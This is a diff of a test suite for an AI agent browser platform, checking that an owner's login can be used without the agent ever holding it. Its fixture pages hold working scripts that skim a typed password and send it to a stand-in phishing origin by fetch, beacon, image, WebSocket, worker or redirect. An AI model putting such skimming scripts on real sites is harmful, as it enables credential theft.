@@ -24,7 +24,7 @@ import { IdentityBroker } from "../../fleet/identity/broker.js";
 import { SimulatedMailProvider } from "../../fleet/identity/providers.js";
 import { initIdentityState, openIdentityState } from "../../fleet/identity/main.js";
 import { PgBrowserGateway } from "../../fleet/browser/gateway.js";
-import { BrowserWorker } from "../../fleet/browser/worker.js";
+import { BrowserWorker, secretForms } from "../../fleet/browser/worker.js";
 import { browserEnvProblems } from "../../fleet/browser/main.js";
 import { browserUrlAllowed, HostResolutionPolicy, addressPrivate } from "../../fleet/browser/policy.js";
 import { totp } from "../../fleet/identity/crypto.js";
@@ -94,6 +94,8 @@ describe.skipIf(!PG_BIN || !CHROME || !OPENSSL)("v37 general browser operator wi
   const mail = new SimulatedMailProvider();
   const users = new Map<string, { email: string; password: string; verified: boolean; totpSeed?: string; totpOn?: boolean; loginCode?: string }>();
   const pending2fa = new Map<string, string>();
+  /** v126: everything that reached the other origin. */
+  const offsite: string[] = [];
   const tokens = new Map<string, string>();
   const API_KEY = `sk_live_${crypto.randomBytes(16).toString("hex")}`;
   const results: unknown[] = [];
@@ -211,6 +213,60 @@ describe.skipIf(!PG_BIN || !CHROME || !OPENSSL)("v37 general browser operator wi
         <script>document.getElementById('photo').addEventListener('change',e=>{document.getElementById('picked').textContent=[...e.target.files].map(f=>f.name+':'+f.size+':'+f.type).join(',')});
         document.getElementById('del').addEventListener('click',()=>{document.getElementById('deleted').textContent=confirm('Delete this draft?')?'deleted':'kept'});</script>`));
       if (u.pathname === "/listing/export.csv") { res.writeHead(200, { "Content-Type": "text/csv", "Content-Disposition": 'attachment; filename="listings.csv"' }); res.end("id,title,price\n1,Cash-flow workbook,12.00\n"); return; }
+      // v126: pages that try to get a filled login out. Script here stands in for a hostile or compromised page.
+      const loginForm = (extra = "", action = "/atk/sink") => `<form id=f method=post action="${action}"><input id=pass name=pass type=password>${extra}<button id=go>Go</button></form>`;
+      if (u.pathname === "/atk/sink") return send(page("Received", "<p>Received</p>"));
+      if (u.pathname === "/atk/redirect307") { res.writeHead(307, { Location: `${PHISH}/redirected` }); return res.end(); }
+      if (u.pathname === "/atk/redirect302") { res.writeHead(302, { Location: "/atk/sink" }); return res.end(); }
+      if (u.pathname === "/atk/form-off") return send(page("Off", loginForm("", `${PHISH}/form`)));
+      if (u.pathname === "/atk/chain") return send(page("Chain", loginForm("", "/atk/hop1")));
+      if (u.pathname === "/atk/hop1") { res.writeHead(307, { Location: "/atk/redirect307" }); return res.end(); }
+      if (u.pathname === "/atk/moved") { res.writeHead(302, { Location: "/login" }); return res.end(); }
+      if (u.pathname === "/atk/search-first") return send(page("Search", `<form action=/s><input id=q name=q type=text placeholder=Search></form><form method=post action=/login><input id=user name=user placeholder=Username><input id=pass name=pass type=password><button>Log in</button></form>`));
+      if (u.pathname === "/atk/get-form") return send(page("Get", `<form method=get action=/atk/sink><input id=user name=user><input id=pass name=pass type=password><button>Go</button></form>`));
+      if (u.pathname === "/atk/stash") return send(page("Stash", `${loginForm()}<script>document.getElementById('pass').addEventListener('input', (e) => { localStorage.setItem('s', e.target.value); document.cookie = 's=' + encodeURIComponent(e.target.value); });</script>`));
+      if (u.pathname === "/atk/open-redirect") { res.writeHead(302, { Location: `${PHISH}/open-redirect${u.search}` }); return res.end(); }
+      if (u.pathname === "/atk/script2") return send(page("Script2", `${loginForm()}<script>document.getElementById('pass').addEventListener('input', (e) => { const v = encodeURIComponent(e.target.value);
+        fetch('/atk/open-redirect?p=' + v).catch(() => {}); try { new Worker('data:,fetch(' + JSON.stringify(${JSON.stringify(PHISH)} + '/worker?p=') + '+' + JSON.stringify(v) + ')'); } catch {} try { new RTCPeerConnection(); document.title = 'webrtc'; } catch {} });</script>`));
+      if (u.pathname === "/atk/promo") return send(page("After", `<form method=post action=/atk/sink><input id=promo name=promo_code></form>`));
+      if (u.pathname === "/atk/to-promo") { res.writeHead(302, { Location: "/atk/promo" }); return res.end(); }
+      if (u.pathname === "/atk/promo-login") return send(page("Login", loginForm("", "/atk/to-promo")));
+      if (u.pathname === "/atk/echo-guess") return send(page(`Echo ${u.searchParams.get("q") ?? ""}`, "<p>echo</p>"));
+      if (u.pathname === "/atk/bounce") { res.writeHead(302, { Location: `${PHISH}/internal-secret-page` }); return res.end(); }
+      if (u.pathname === "/atk/labelled") return send(page("Labelled", `<form><label id=lb>New <span id=sp>password</span><input id=np type=password></label></form>`));
+      if (u.pathname === "/atk/get-button") return send(page("GetBtn", `<form method=post action=/atk/sink><input id=pass name=pass type=password><button formmethod=get>Go</button></form>`));
+      if (u.pathname === "/atk/promo-code") return send(page("After", `<form method=post action=/atk/sink><input id=code name=postcode placeholder="Promo code"></form>`));
+      if (u.pathname === "/atk/to-promo-code") { res.writeHead(302, { Location: "/atk/promo-code" }); return res.end(); }
+      if (u.pathname === "/atk/promo-code-login") return send(page("Login", loginForm("", "/atk/to-promo-code")));
+      if (u.pathname === "/atk/dead") return send(page("Dead", `<a id=dead href="https://127.0.0.1:1/">dead</a>`));
+      if (u.pathname === "/atk/formaction") return send(page("Formaction", loginForm(`<button id=off formaction="${PHISH}/formaction">Off</button>`)));
+      if (u.pathname === "/atk/307") return send(page("307", loginForm("", "/atk/redirect307")));
+      if (u.pathname === "/atk/302") return send(page("302", loginForm("", "/atk/redirect302")));
+      if (u.pathname === "/atk/frame") return send(page("Frame", `<iframe id=fr src="${PHISH}/framed"></iframe>`));
+      if (u.pathname === "/atk/script") return send(page("Script", `${loginForm()}<script>
+        document.getElementById('pass').addEventListener('input', (e) => { const v = e.target.value; const o = ${JSON.stringify(PHISH)};
+          fetch(o + '/fetch', { method: 'POST', mode: 'no-cors', body: v }).catch(() => {});
+          navigator.sendBeacon(o + '/beacon', v);
+          new Image().src = o + '/img?p=' + encodeURIComponent(v);
+          new Image().src = o + '/img64?p=' + btoa(v);
+          fetch(o + '/get?p=' + encodeURIComponent(v), { mode: 'no-cors' }).catch(() => {});
+          try { new WebSocket(o.replace('https', 'wss') + '/ws?p=' + encodeURIComponent(v)); } catch {}
+        });</script>`));
+      if (u.pathname === "/atk/popup") return send(page("Popup", `${loginForm()}<button id=pop onclick="window.open('${PHISH}/popup')">Open</button>`));
+      if (u.pathname === "/atk/echo") return send(page("Echo", `${loginForm(`<input id=reveal type=password role=button><label for=lab id=ll>L</label><input id=lab>`)}<a id=l href="/x">x</a><div id=d></div><script>
+        document.getElementById('pass').addEventListener('input', (e) => { const v = e.target.value;
+          document.title = 'T ' + v;
+          document.getElementById('d').innerText = 'plain ' + v + ' pct ' + encodeURIComponent(v) + ' b64 ' + btoa(v) + ' json ' + JSON.stringify(v);
+          document.getElementById('l').href = '/x/' + encodeURIComponent(v) + '?b=' + btoa(v);
+          document.getElementById('l').textContent = v;
+          document.getElementById('ll').textContent = v;
+          document.getElementById('lab').setAttribute('placeholder', v);
+          const b = document.createElement('input'); b.type = 'submit'; b.value = v; b.name = v; document.body.appendChild(b);
+          e.target.type = 'button';
+          history.replaceState(null, '', '/atk/echo/' + encodeURIComponent(v));
+          alert(v);
+        });</script>`));
+      if (u.pathname === "/atk/swap") return send(page("Swap", `<form method=post action=/atk/sink><input id=pass name=pass type=text></form>`));
       if (u.pathname === "/out") return send(page("Links", `<a id=away href="${PHISH}/">away</a>`));
       if (u.pathname === "/listing/preview") return send(page("Listing preview", "<h1>Cash-flow workbook</h1><p>Preview as buyers see it</p>"));
       // v79: a JavaScript-rendered profile wizard (content arrives after load; a hidden file input behind a drop zone; a
@@ -240,8 +296,15 @@ describe.skipIf(!PG_BIN || !CHROME || !OPENSSL)("v37 general browser operator wi
       }
       return send(page("Not found", "nothing"), 404);
     });
-    phish = https.createServer(tls, (_req, res) => { res.writeHead(200, { "Content-Type": "text/html" });
-      res.end(page("Session expired", `<input id=password type=password><button>Continue</button>`)); });
+    phish = https.createServer(tls, (req, res) => {
+      let body = ""; req.on("data", (c) => (body += c));
+      req.on("end", () => {
+        offsite.push(`${req.method} ${req.url} ${body}`);
+        res.writeHead(200, { "Content-Type": "text/html", "Access-Control-Allow-Origin": "*" });
+        res.end(page("Session expired", `<input id=password type=password><button>Continue</button>`));
+      });
+    });
+    phish.on("upgrade", (req, sock) => { offsite.push(`WS ${req.url}`); sock.destroy(); });
     await new Promise<void>((r) => site.listen(0, "127.0.0.1", () => r()));
     await new Promise<void>((r) => phish.listen(0, "127.0.0.1", () => r()));
     SITE = `https://127.0.0.1:${(site.address() as { port: number }).port}`;
@@ -488,65 +551,225 @@ describe.skipIf(!PG_BIN || !CHROME || !OPENSSL)("v37 general browser operator wi
     }
   });
 
-  it("v125: the owner hands over an account they made: sealed to the broker, used by the agent, never seen; its sites and password stay the owner's", async () => {
-    // Disabled in this release (fleet-v125-containment-pg proves it). These checks stay for the later release that replaces this function.
-    await R.q(`CREATE OR REPLACE FUNCTION fleet.fleet_account_handover_enabled() RETURNS boolean LANGUAGE sql STABLE AS $$ SELECT true $$`);
-    const password = `Owner-${crypto.randomUUID()}`;
-    users.set("ownerhanded", { email: "owner@site.test", password, verified: true });
-    const pub = (broker as any).o.ownerVault.publicKeyBase64();
-    const sealed = sealAccountLogin(Buffer.from(pub, "base64"), A.id, JSON.stringify({ password }));
-    const h = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'shop.test', $2, 'ownerhanded', $3, $4) AS r`, [A.id, SITE, sealed, OWNER]))[0].r as any;
-    expect((await R.q(`SELECT sealed IS NOT NULL AS s, status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [h.uploadId]))[0]).toMatchObject({ s: true, status: "pending" });
+  it("v126: a control: outside sign_in these hostile pages really do send a value away", async () => {
+    offsite.length = 0;
+    const c = await ok(R.econ(A, "browser.open", { url: `${SITE}/atk/script` }));
+    const value = "control-value-123";
+    await browse(A, "browser.observe", { sessionId: c.sessionId });
+    const r = await browse(A, "browser.act", { sessionId: c.sessionId, steps: [{ action: "fill", selector: "#pass", value }, { action: "wait", ms: 800 }] });
+    expect(r.status, JSON.stringify(r.result)).toBe("done");
+    for (const where of ["/fetch", "/beacon", "/img?", "/img64?", "/get?", "WS /ws"]) expect(offsite.join("\n"), where).toContain(where);
+    offsite.length = 0;
+    await browse(A, "browser.act", { sessionId: c.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/chain` }, { action: "fill", selector: "#pass", value }, { action: "click", selector: "#go" }, { action: "wait", ms: 500 }] });
+    expect(offsite.join("\n")).toContain(value);
+    await browse(A, "browser.close", { sessionId: c.sessionId });
+  });
+
+  it("v126: the whole flow in real Chrome: the owner's login is sealed and signs in; the agent works in that session and never has the login", async () => {
+    const password = `Owner'!-${crypto.randomUUID()}`, seed = "JBSWY3DPEHPK3PXP", handle = "ownerflow";
+    users.set(handle, { email: "owner@site.test", password, verified: true, totpSeed: seed, totpOn: true });
+    const pub = Buffer.from((broker as any).o.ownerVault.publicKeyBase64(), "base64");
+    const seal = (who: { handle: string; loginUrl: string; platform?: string; agentId?: string }, v: unknown) => sealAccountLogin(pub, { agentId: A.id, platform: "flow.test", ...who }, JSON.stringify(v));
+    const hand = async (who: string, url: string, sealed: Buffer) => (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, $3, $4, $5) AS r`, [A.id, url, who, sealed, OWNER]))[0].r as any;
+    const h = await hand(handle, `${SITE}/login`, seal({ handle, loginUrl: `${SITE}/login` }, { password, totpSeed: seed }));
     await broker.tick();
-    expect((await R.q(`SELECT sealed IS NULL AS s, status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [h.uploadId]))[0]).toMatchObject({ s: true, status: "installed" });
-    expect((await R.q(`SELECT status FROM fleet.fleet_agent_accounts WHERE account_id = $1`, [h.accountId]))[0].status).toBe("active");
+    const creds = async (id: string) => (await R.q(`SELECT kind, status, vault_ref FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 ORDER BY kind, status`, [id])) as any[];
+    expect((await creds(h.accountId)).map((c) => `${c.kind}:${c.status}`)).toEqual(["password:active", "totp:active"]);
+    expect(await R.q(`SELECT 1 FROM fleet.fleet_account_handover_inbox WHERE account_id = $1 AND sealed IS NOT NULL`, [h.accountId])).toHaveLength(0);
     const task = (await R.q(`SELECT body FROM fleet.fleet_owner_tasks WHERE agent_id = $1 AND closed_at IS NULL ORDER BY created_at DESC LIMIT 1`, [A.id]))[0] as any;
     expect(task.body).toContain(h.accountId);
-    const opened = await ok(R.econ(A, "browser.open", { url: `${SITE}/login`, accountId: h.accountId }));
-    const r = await browse(A, "browser.act", { sessionId: opened.sessionId, steps: [{ action: "fill", selector: "#user", credential: "username" }, { action: "fill", selector: "#pass", credential: "password" }, { action: "click", text: "Log in" }, { action: "wait_for", selector: "#key" }] });
-    expect(r.status, JSON.stringify(r.result)).toBe("done");
-    const everything = JSON.stringify(r) + JSON.stringify(await R.q(`SELECT (SELECT jsonb_agg(result) FROM fleet.fleet_browser_actions) a, (SELECT jsonb_agg(steps) FROM fleet.fleet_browser_actions) s, (SELECT jsonb_agg(detail) FROM fleet.fleet_events) e, (SELECT jsonb_agg(t.body) FROM fleet.fleet_owner_tasks t) t`));
-    expect(everything).not.toContain(password);
+    expect(task.body).toContain("sign_in");
+
+    const open = async (accountId: string, url = `${SITE}/out`) => (await ok(R.econ(A, "browser.open", { url, accountId }))).sessionId as string;
+    const seen: unknown[] = [];
+    const act = async (id: string, steps: any[]) => { const r = await browse(A, "browser.act", { sessionId: id, steps }); seen.push(r); return r; };
+    let sid = await open(h.accountId);
+    await browse(A, "browser.observe", { sessionId: sid });
+
+    // Signing in: password and authenticator, and the session arrives in the agent's context.
+    const signed = await act(sid, [{ action: "sign_in" }]);
+    expect(signed.status, JSON.stringify(signed.result)).toBe("done");
+    expect(signed.result.url).toBe(`${SITE}/dashboard`);
+    // Routine work carries on, including an image: the login was never in this browser context.
+    const work = await act(sid, [{ action: "goto", url: `${SITE}/listing/preview` }, { action: "screenshot" }]);
+    expect(work.status, JSON.stringify(work.result)).toBe("done");
+    expect(work.result.text).toContain("Cash-flow workbook");
+    expect(work.result.files).toHaveLength(1);
+    expect((await act(sid, [{ action: "goto", url: `${SITE}/dashboard` }])).result.url).toBe(`${SITE}/dashboard`);
+
+    // The agent cannot ask for the login, by the worker or, separately, from the registry.
+    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
+    for (const credential of ["password", "totp", "generate_password", "new_password", "api_key"]) expect((await act(sid, [{ action: "fill", selector: "#pass", credential }])).result.code, credential).toBe("FLEET_OWNER_ACCOUNT");
+    const bx = new pg.Pool({ connectionString: R.pgc.browserUrl, max: 1 });
+    try {
+      const lease = crypto.randomBytes(32).toString("base64url");
+      const queued = await econNext(R, A, "browser.observe", { sessionId: sid });
+      const claim = (await bx.query(`SELECT fleet.bx_claim_action('browser-worker', $1) AS r`, [crypto.createHash("sha256").update(lease).digest("hex")])).rows[0].r;
+      expect(claim.action.actionId).toBe(queued.actionId);
+      expect(claim.action).toMatchObject({ ownerAccount: true, loginUrl: `${SITE}/login` });
+      for (const kind of ["password", "totp", "generate_password", "new_password", "auth_link", "capture:password"]) {
+        expect((await bx.query(`SELECT fleet.bx_secret_request($1, $2, $3, $4, 'k', NULL) AS r`, [claim.action.actionId, lease, kind, SITE])).rows[0].r, kind).toMatchObject({ ok: false, code: "FLEET_OWNER_ACCOUNT" });
+      }
+      await bx.query(`SELECT fleet.bx_report_action($1, $2, true, '{}'::jsonb, NULL)`, [claim.action.actionId, lease]);
+    } finally { await bx.end(); }
+    // sign_in is alone in its action, and only in a session with an account.
+    expect((await econNext(R, A, "browser.act", { sessionId: sid, steps: [{ action: "sign_in" }, { action: "wait", ms: 1 }] })).code).toBe("FLEET_BAD_REQUEST");
+
+    // A guess cannot be confirmed: the login is not held where a page's echo would be redacted.
+    const guess = await act(sid, [{ action: "goto", url: `${SITE}/atk/echo-guess?q=${encodeURIComponent(password)}` }]);
+    expect(guess.result.title).toBe(`Echo ${password}`);
+    seen.pop(); // the test typed this itself, and the sweep below looks for it
+    results.pop();
+    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
+    expect((await act(sid, [{ action: "fill", selector: "#pass", credential: "username" }])).result.code, "the name into a password field").toBe("FLEET_OWNER_ACCOUNT");
+    await act(sid, [{ action: "goto", url: `${SITE}/atk/labelled` }]);
+    for (const selector of ["#lb", "#sp"]) {
+      expect((await act(sid, [{ action: "fill", selector, value: "agents-own-password" }])).result.code, selector).toBe("FLEET_OWNER_ACCOUNT");
+      expect((await act(sid, [{ action: "fill", selector, credential: "username" }])).result.code, selector).toBe("FLEET_OWNER_ACCOUNT");
+    }
+    await act(sid, [{ action: "goto", url: `${SITE}/login` }]);
+    // The agent cannot replace it.
+    expect((await act(sid, [{ action: "fill", selector: "#pass", value: "agents-own-password" }])).result.code).toBe("FLEET_OWNER_ACCOUNT");
+    for (const key of ["a", "Space", "Control+v"]) expect((await act(sid, [{ action: "press", key }])).result.code, key).toBe("FLEET_OWNER_ACCOUNT");
+    expect((await act(sid, [{ action: "goto", url: `${SITE}/account/password` }])).status, "the password page").toBe("failed");
+    for (const a of [{ action: "capture", selector: "body", kind: "api_key" }, { action: "open_auth_link" }]) expect((await act(sid, [a])).result.code, a.action).toBe("FLEET_OWNER_ACCOUNT");
+    await browse(A, "browser.close", { sessionId: sid });
+
+    // The sign-in page itself turns hostile. Each is a real account whose login page is the attack: nothing reaches the other origin, and the agent's result holds nothing.
+    let n = 0;
+    const attempt = async (path: string) => {
+      const who = `hostile${++n}`;
+      users.set(who, { email: "o@site.test", password, verified: true });
+      const x = await hand(who, `${SITE}${path}`, seal({ handle: who, loginUrl: `${SITE}${path}` }, { password }));
+      await broker.tick();
+      const id = await open(x.accountId);
+      await browse(A, "browser.observe", { sessionId: id });
+      const r = await act(id, [{ action: "sign_in" }]);
+      await browse(A, "browser.close", { sessionId: id });
+      return r;
+    };
+    offsite.length = 0;
+    for (const path of ["/atk/script", "/atk/307", "/atk/chain", "/atk/formaction", "/atk/echo", "/atk/popup"]) await attempt(path);
+    const away = offsite.join("\n");
+    for (const f of secretForms(password)) expect(away, f).not.toContain(f);
+    expect(offsite.filter((x) => !x.startsWith("GET "))).toEqual([]);
+    offsite.length = 0;
+    expect((await attempt("/atk/stash")).result.code, "a login stashed in browser storage does not come across").toBe("FLEET_SIGNIN_FORM");
+    await attempt("/atk/script2");
+    expect(offsite.join("\n"), "no redirect, worker or peer connection carried it").not.toMatch(/open-redirect|worker/);
+    expect((await attempt("/atk/get-form")).result.code, "a form that would put it in an address").toBe("FLEET_SIGNIN_FORM");
+    // A search box before the form does not get the name, and the name reaches the right field.
+    const searched = await attempt("/atk/search-first");
+    expect(searched.status, JSON.stringify(searched.result)).toBe("done");
+    offsite.length = 0;
+    const seenSink = (await attempt("/atk/get-button"));
+    expect(seenSink.result.url ?? "", "a button that turns the form into a GET").not.toContain("pass=");
+    // A box called code that says it is a promotion gets nothing either.
+    const promoCode = await attempt("/atk/promo-code-login");
+    expect(promoCode.status, JSON.stringify(promoCode.result)).toBe("done");
+    // A box that only looks like the code gets nothing.
+    const promo = await attempt("/atk/promo-login");
+    expect(promo.status, JSON.stringify(promo.result)).toBe("done");
+    expect(promo.result.url).toBe(`${SITE}/atk/promo`);
+    // A form that posts elsewhere, a page that is not a password form, a login page that moved: nothing is asked for.
+    const before = (await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_browser_secret_requests WHERE kind = 'password'`))[0].n;
+    expect((await attempt("/atk/form-off")).result.code).toBe("FLEET_ORIGIN_NOT_PINNED");
+    expect((await attempt("/atk/swap")).result.code).toBe("FLEET_SIGNIN_FORM");
+    expect((await attempt("/atk/moved")).result.code).toBe("FLEET_SIGNIN_MOVED");
+    expect((await attempt("/captcha")).result.code).toBe("FLEET_SIGNIN_HUMAN");
+    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_browser_secret_requests WHERE kind = 'password'`))[0].n).toBe(before);
+    // An ordinary same-site redirect after the form works.
+    const fine = await attempt("/atk/302");
+    expect(fine.status, JSON.stringify(fine.result)).toBe("done");
+    expect(fine.result.url).toBe(`${SITE}/atk/sink`);
+
+    // Nothing the agent can read, and nothing stored, holds it in any form, even after a page echoed it.
+    const everything = JSON.stringify(seen) + JSON.stringify(results) + JSON.stringify(await R.q(`SELECT (SELECT jsonb_agg(result) FROM fleet.fleet_browser_actions WHERE steps::text NOT LIKE '%echo-guess%') a, (SELECT jsonb_agg(steps) FROM fleet.fleet_browser_actions WHERE steps::text NOT LIKE '%echo-guess%') s,
+      (SELECT jsonb_agg(detail) FROM fleet.fleet_events) e, (SELECT jsonb_agg(body) FROM fleet.fleet_owner_tasks) t`));
+    for (const f of secretForms(password)) expect(everything, f).not.toContain(f);
+    expect(everything).not.toContain(seed);
+
+    // A freeze stops a session already signed in, and new sign-ins.
+    const frozen = await open(h.accountId);
+    await browse(A, "browser.observe", { sessionId: frozen });
+    await R.q(`SELECT fleet.fleet_admin_account_freeze($1, 'test', $2)`, [h.accountId, OWNER]);
+    const stopped = JSON.stringify(await R.econ(A, "browser.act", { sessionId: frozen, steps: [{ action: "goto", url: `${SITE}/dashboard` }] }).catch((e: Error) => ({ code: e.message })));
+    expect(stopped).toMatch(/FLEET_ACCOUNT_FROZEN/);
+    await R.q(`SELECT fleet.fleet_admin_account_unfreeze($1, 'active', $2)`, [h.accountId, OWNER]);
+    await browse(A, "browser.close", { sessionId: frozen });
+    // The sign-in page is given as a page: not a bare site, not a default port, no query.
+    for (const bad of ["https://shop.test", "https://shop.test:443/login", "https://shop.test/login?next=/x"]) {
+      await expect(R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, 'badurl', $3, $4)`, [A.id, bad, Buffer.alloc(64, 1), OWNER]), bad).rejects.toThrow(/FLEET_ORIGIN_INVALID/);
+    }
+
+    // A re-seal: a failed or pending one changes nothing; a login sealed for another account, site or agent is refused.
+    const state = async () => (await R.q(`SELECT origins, login_url FROM fleet.fleet_agent_accounts WHERE account_id = $1`, [h.accountId]))[0];
+    const was = await state();
+    const replay = await hand(handle, `${PHISH}/login`, seal({ handle, loginUrl: `${SITE}/login` }, { password }));
+    expect(await state(), "pending").toEqual(was);
+    await broker.tick();
+    expect((await R.q(`SELECT status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [replay.uploadId]))[0].status).toBe("failed");
+    expect(await state(), "failed").toEqual(was);
+    expect(await R.q(`SELECT 1 FROM fleet.fleet_notifications WHERE code = 'ACCOUNT_HANDOVER_FAILED' AND detail ->> 'accountId' = $1`, [h.accountId])).toHaveLength(1);
+    expect((await creds(h.accountId)).filter((c) => c.status === "active")).toHaveLength(2);
+    sid = await open(h.accountId);
+    await browse(A, "browser.observe", { sessionId: sid });
+    expect((await act(sid, [{ action: "sign_in" }])).result.url, "the old login still works").toBe(`${SITE}/dashboard`);
+    await browse(A, "browser.close", { sessionId: sid });
+    // A successful one moves the site and destroys the old login.
+    const oldRefs = (await creds(h.accountId)).map((c) => c.vault_ref as string);
+    const moved = await hand(handle, `${PHISH}/signin`, seal({ handle, loginUrl: `${PHISH}/signin` }, { password: `${password}-new` }));
+    await broker.tick();
+    expect((await R.q(`SELECT status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [moved.uploadId]))[0].status).toBe("installed");
+    expect(await state()).toEqual({ origins: [PHISH.toLowerCase()], login_url: `${PHISH}/signin` });
+    for (const ref of oldRefs) expect((broker as any).vault.shred(ref), "already destroyed").toBe(false);
+    // The agent's own-account path and account operations stay refused on the owner's account.
     const refused = (p: Promise<any>) => p.catch((e: Error) => ({ ok: false, code: e.message }));
-    expect(JSON.stringify(await refused(R.econ(A, "account.add_origin", { accountId: h.accountId, origin: "https://elsewhere.test" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
-    expect(JSON.stringify(await refused(R.econ(A, "account.password_confirm", { accountId: h.accountId })))).toMatch(/FLEET_OWNER_ACCOUNT/);
-    const phish = await browse(A, "browser.act", { sessionId: opened.sessionId, steps: [{ action: "goto", url: PHISH }, { action: "fill", selector: "#password", credential: "password" }] });
-    expect(phish.result.code).toBe("FLEET_ORIGIN_NOT_PINNED");
-    // The password goes only into a real password field: never a text box or an embedded frame, where it could be read back or sent elsewhere.
-    const step = async (st: any[]) => browse(A, "browser.act", { sessionId: opened.sessionId, steps: st });
-    await step([{ action: "goto", url: `${SITE}/login` }]);
-    expect((await step([{ action: "fill", selector: "#user", credential: "password" }])).result.code).toBe("FLEET_BROWSER_FIELD_REFUSED");
-    expect((await step([{ action: "fill", frame: "iframe", selector: "#pass", credential: "password" }])).result.code).toBe("FLEET_ORIGIN_NOT_PINNED");
-    expect((await step([{ action: "fill", selector: "#pass", credential: "password" }, { action: "pdf" }])).result.code).toBe("FLEET_BROWSER_CAPTURE_REFUSED");
-    // The agent's own-account path cannot replace the owner's login; nor can it shred or re-label the account.
-    const gen = await step([{ action: "fill", selector: "#pass", credential: "generate_password" }]);
-    expect(gen.status, JSON.stringify(gen.result)).toBe("failed");
-    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND status = 'active' AND kind = 'password'`, [h.accountId]))[0].n).toBe(1);
-    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND status <> 'active'`, [h.accountId]))[0].n).toBe(0);
-    for (const op of ["account.revoke", "account.close", "account.rotate", "account.recover"]) {
+    for (const op of ["account.revoke", "account.close", "account.rotate", "account.recover", "account.operate", "account.verify_identity"]) {
       expect(JSON.stringify(await refused(R.econ(A, op, { accountId: h.accountId, reason: "not mine to do", kind: "password" }))), op).toMatch(/FLEET_OWNER_ACCOUNT/);
     }
+    expect(JSON.stringify(await refused(R.econ(A, "account.add_origin", { accountId: h.accountId, origin: "https://elsewhere.test" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
+    expect(JSON.stringify(await refused(R.econ(A, "account.password_confirm", { accountId: h.accountId })))).toMatch(/FLEET_OWNER_ACCOUNT/);
     expect(JSON.stringify(await refused(R.econ(A, "account.mark", { accountId: h.accountId, status: "closed" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
-    expect(JSON.stringify(await refused(R.econ(A, "account.mark", { accountId: h.accountId, status: "human_action_required", verification: "identity_verified" })))).toMatch(/FLEET_OWNER_ACCOUNT/);
     await ok(R.econ(A, "account.mark", { accountId: h.accountId, status: "human_action_required", note: "a CAPTCHA needs the owner" }));
-    // A corrected login for the same account replaces the old one; it doesn't reopen a state the owner chose.
-    const again = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'shop.test', $2, 'ownerhanded', $3, $4) AS r`, [A.id, SITE, sealAccountLogin(Buffer.from(pub, "base64"), A.id, JSON.stringify({ password: `${password}-2` })), OWNER]))[0].r as any;
-    expect(again.accountId).toBe(h.accountId);
-    await broker.tick();
-    expect((await R.q(`SELECT status FROM fleet.fleet_agent_accounts WHERE account_id = $1`, [h.accountId]))[0].status).toBe("human_action_required");
-    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND status = 'rotated' AND kind = 'password'`, [h.accountId]))[0].n).toBe(1);
-    // Sealed for another agent: refused, erased, and the owner hears it.
-    const wrong = sealAccountLogin(Buffer.from(pub, "base64"), "01M3F50SH7PNX2E3GST13J52AS", JSON.stringify({ password }));
-    const bad = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'shop2.test', $2, 'ownerhanded2', $3, $4) AS r`, [A.id, SITE, wrong, OWNER]))[0].r as any;
-    await broker.tick();
-    expect((await R.q(`SELECT sealed IS NULL AS s, status FROM fleet.fleet_account_handover_inbox WHERE upload_id = $1`, [bad.uploadId]))[0]).toMatchObject({ s: true, status: "failed" });
-    expect(await R.q(`SELECT 1 FROM fleet.fleet_notifications WHERE code = 'ACCOUNT_HANDOVER_FAILED' AND detail ->> 'accountId' = $1`, [bad.accountId])).toHaveLength(1);
-    // Sealing it again after a failure works: same account, no dead end.
-    const fixed = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'shop2.test', $2, 'ownerhanded2', $3, $4) AS r`, [A.id, SITE, sealAccountLogin(Buffer.from(pub, "base64"), A.id, JSON.stringify({ password })), OWNER]))[0].r as any;
-    expect(fixed.accountId).toBe(bad.accountId);
-    await broker.tick();
-    expect((await R.q(`SELECT status FROM fleet.fleet_agent_accounts WHERE account_id = $1`, [bad.accountId]))[0].status).toBe("active");
+    // Only the owner role can hand over.
+    const acl = await R.q(`SELECT r, has_function_privilege(r, 'fleet.fleet_admin_account_handover(text, text, text, text, text, bytea, text)', 'EXECUTE') AS can FROM unnest(ARRAY['fleet_agent','fleet_service','fleet_browser','fleet_operator','fleet_identity']) r`);
+    expect(acl.filter((x: any) => x.can)).toEqual([]);
+  }, 120_000);
+
+  it("v126: a redirect onto an address the policy refuses shows the agent nothing of it", async () => {
+    const blocked = new (class extends HostResolutionPolicy { override async allowed(url: string, o?: { allowLoopback?: boolean }) { return !url.startsWith(PHISH) && super.allowed(url, o); } })();
+    (worker as any).hosts = blocked;
+    try {
+      const o = await ok(R.econ(A, "browser.open", { url: `${SITE}/out` }));
+      await browse(A, "browser.observe", { sessionId: o.sessionId });
+      const r = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/bounce` }] });
+      expect(r.result.code).toBe("FLEET_BROWSER_URL_BLOCKED");
+      expect(r.result.url).toBe("about:blank");
+      expect(JSON.stringify(r.result)).not.toContain("Session expired");
+      // In the same action, nothing is captured of it either.
